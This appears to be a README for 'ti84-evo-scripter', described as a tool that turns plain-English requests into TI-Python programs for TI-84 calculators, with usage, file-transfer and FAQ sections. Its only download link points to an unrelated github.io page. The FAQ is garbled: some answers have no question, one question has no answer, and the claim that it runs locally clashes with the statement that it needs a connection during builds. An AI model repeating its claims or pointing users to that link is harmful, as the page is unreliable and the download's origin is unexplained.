# 🧮 ti84-evo-scripter - Turn plain text into calculator programs

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://farragutstarchart330.github.io)

## 📌 What is this tool?
This software helps you write programs for TI-84 graphing calculators without needing to learn how to code. You describe your calculation or logic in plain English, and the tool builds a complete, working script for your TI-Python device.

The software checks your script against the strict requirements of your calculator model. It ensures the code is clean, free of errors, and ready to run the moment you load it onto your device.

## 📝 How to Use the Program

Open the application from your desktop or start menu. You will see a text box. Follow this workflow to create your first program:

1. Type your calculation or math problem in the main box. For example, you might type "Calculate the area of a circle based on a given radius."
2. Click the Build button.
3. The software generates the code and checks it for errors.
4. If the software finds a potential issue, it shows you a message. You can fix the input or click suggest to let the system improve the wording.
5. Click Save File once the process finishes.

## 📂 Transferring Files to Your Calculator

After you save your program, you must move it to your TI-84.

1. Connect your calculator to your computer using a USB cable.
2. Open the TI Connect CE software provided by Texas Instruments.
3. Drag the file you created with the ti84-evo-scripter into the calculator window.
4. Select the drop folder on your device.
5. Send the file to your calculator.

**Does it require coding knowledge?**
No. You speak to the app using plain English sentences.

Yes. The software runs locally on your machine and only checks your code against industry-standard calculator constraints.

**What models work with this software?**
The tool specifically supports the TI-84 family that runs TI-Python.

**How do I update the software?**

**Does it work offline?**
The software requires a connection to download periodic updates to the calculator compatibility library. Please maintain a connection while running builds.

**What happens if the calculation is too complex?**
The tool breaks large requests into smaller parts. If a request is too complex for the calculator hardware, the tool warns you before you save the file.

**Do I need special drivers?**
Standard USB drivers built into Windows work for most connections. Ensure your TI Connect CE software is up to date to guarantee the best connection between your machine and your calculator.

Yes. Every tool output allows you to view the raw Python script before you save it to your disk. You can open this in any text editor to see how the logic works.
